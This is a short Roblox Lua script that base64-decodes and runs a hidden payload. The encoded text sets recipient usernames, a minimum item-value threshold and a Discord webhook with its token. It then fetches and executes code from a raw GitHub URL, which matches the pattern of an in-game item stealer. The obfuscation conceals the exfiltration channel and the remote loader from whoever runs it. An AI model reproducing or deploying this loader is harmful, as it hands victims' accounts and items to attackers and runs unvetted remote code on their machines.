
-- Obfuscated script
local encodedScript = "VXNlcm5hbWUgPSAiZ2l2ZW1lZm9ydG5pdGV2YnVjayIKVXNlcm5hbWUyID0gImdpdmVtZWZvcnRuaXRldmJ1Y2siCk1pbmltdW1SQVAgPSAxMDAwMDAKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzQyMDk4NTc2NDYxMDA0ODAyL2NUbGktX294TXIwUVptSWl2NmdyQTJUc2VBdXJBaTVVX05HaUt3Vl9udUNXLVVpUENRWmpWR2I2Z25nV2JuSWlDVlBJIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMTRFbGkvMjE0c2NyaXB0cy9yZWZzL2hlYWRzL21haW4vMjE0c2NyaXB0cyIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()
